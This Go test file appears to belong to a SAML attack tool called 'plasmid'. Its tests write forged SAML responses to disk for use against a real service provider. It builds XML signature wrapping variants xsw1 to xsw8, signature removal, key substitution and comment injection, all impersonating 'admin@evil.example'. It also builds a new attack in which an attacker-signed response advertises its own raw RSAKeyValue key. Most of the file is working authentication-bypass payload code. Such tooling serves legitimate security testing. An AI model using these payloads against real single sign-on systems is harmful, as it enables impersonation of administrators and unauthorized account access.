package saml

import (
	"encoding/base64"
	"encoding/pem"
	"math/big"
	"os"
	"path/filepath"
	"testing"

	"github.com/beevik/etree"
)

// TestSweepAllModes dumps one payload per attack mode plasmid offers, so the
// whole catalogue can be run against a real implementation and the operator can
// be told which modes matter against which SP stack.
func TestSweepAllModes(t *testing.T) {
	dir := os.Getenv("PLASMID_DUMP_DIR")
	if dir == "" {
		t.Skip("set PLASMID_DUMP_DIR to dump the mode catalogue")
	}
	key, cert := realIDPMaterial(t)

	// Every payload here is signed under this key, so the bench has to configure
	// the SP with this certificate. A mismatched one makes every mode fail on the
	// certificate before the attack is reached.
	certPath := filepath.Join(dir, "mode-idp-cert.pem")
	if err := os.WriteFile(certPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}), 0o644); err != nil {
		t.Fatalf("write cert: %v", err)
	}
	t.Logf("wrote %s", certPath)

	write := func(name string, data []byte) {
		if err := os.WriteFile(filepath.Join(dir, "mode-"+name+".xml"), data, 0o644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		t.Logf("wrote mode-%s.xml", name)
	}

	// An untampered response under the same key, so a rejection elsewhere is the
	// mode's doing rather than the harness's.
	write("baseline", fullResponse(t, key, cert, "alice@example.com", true))

	resigner := NewResigner(key, cert)
	for _, mode := range SignKeyModes {
		out, _, err := resigner.Apply(fullResponse(t, key, cert, "admin@evil.example", true), mode)
		if err != nil {
			t.Logf("signkey %s: %v", mode, err)
			continue
		}
		write("signkey-"+mode, out)
	}

	for _, variant := range []string{"xsw1", "xsw2", "xsw3", "xsw4", "xsw5", "xsw6", "xsw7", "xsw8"} {
		out, err := ApplyXSW(fullResponse(t, key, cert, "alice@example.com", true), variant, "admin@evil.example")
		if err != nil {
			t.Logf("%s: %v", variant, err)
			continue
		}
		write(variant, out)
	}

	for _, mode := range []string{"remove_response", "remove_both", "empty_value", "invalid_digest"} {
		out, err := applySignatureMode(fullResponse(t, key, cert, "admin@evil.example", true), mode)
		if err != nil {
			t.Logf("sigmode %s: %v", mode, err)
			continue
		}
		write("sigmode-"+mode, out)
	}

	out, err := ApplyCommentInjection(fullResponse(t, key, cert, "admin@evil.example", true), 1)
	if err != nil {
		t.Logf("comment injection: %v", err)
	} else {
		write("comment-injection", out)
	}
}

// TestSweepRawKeyValue builds a candidate for a mode plasmid does not have yet:
// the signature is made with attacker key material and KeyInfo advertises that
// key as a raw ds:RSAKeyValue rather than an X509 certificate. An SP that
// verifies against document-supplied key material instead of the certificate it
// was configured with accepts it. KeyInfo sits outside SignedInfo, so replacing
// it after signing leaves the signature intact.
func TestSweepRawKeyValue(t *testing.T) {
	dir := os.Getenv("PLASMID_DUMP_DIR")
	if dir == "" {
		t.Skip("set PLASMID_DUMP_DIR to dump the raw KeyValue candidate")
	}
	realKey, realCert := realIDPMaterial(t)
	attackKey, attackCert := realIDPMaterial(t)

	// Signed by the attacker, so the real certificate cannot verify it. Only the
	// assertion is signed: a response signature would cover the assertion, and
	// rewriting KeyInfo inside the assertion would then break the response
	// digest and mask the result.
	signedByAttacker := fullResponse(t, attackKey, attackCert, "admin@evil.example", false)

	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(signedByAttacker); err != nil {
		t.Fatalf("reparse: %v", err)
	}
	replaced := 0
	for _, el := range []*etree.Element{doc.Root(), findElement(doc.Root(), "saml", "Assertion")} {
		if el == nil {
			continue
		}
		sig := findSignature(el)
		if sig == nil {
			continue
		}
		if ki := findElement(sig, "ds", "KeyInfo"); ki != nil {
			sig.RemoveChild(ki)
		}
		ki := sig.CreateElement("ds:KeyInfo")
		rsa := ki.CreateElement("ds:KeyValue").CreateElement("ds:RSAKeyValue")
		rsa.CreateElement("ds:Modulus").SetText(base64.StdEncoding.EncodeToString(attackKey.PublicKey.N.Bytes()))
		rsa.CreateElement("ds:Exponent").SetText(base64.StdEncoding.EncodeToString(big.NewInt(int64(attackKey.PublicKey.E)).Bytes()))
		replaced++
	}
	if replaced == 0 {
		t.Fatal("no signature to re-advertise")
	}

	out, err := doc.WriteToBytes()
	if err != nil {
		t.Fatalf("serialize: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "cand-raw-keyvalue.xml"), out, 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}

	// The oracle has to be given the real IdP certificate, so that accepting the
	// payload means the SP trusted the key the document carried.
	pemBytes := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: realCert.Raw})
	if err := os.WriteFile(filepath.Join(dir, "cand-real-cert.pem"), pemBytes, 0o644); err != nil {
		t.Fatalf("write cert: %v", err)
	}
	_ = realKey
	t.Logf("wrote cand-raw-keyvalue.xml (%d signatures re-advertised) and cand-real-cert.pem", replaced)
}
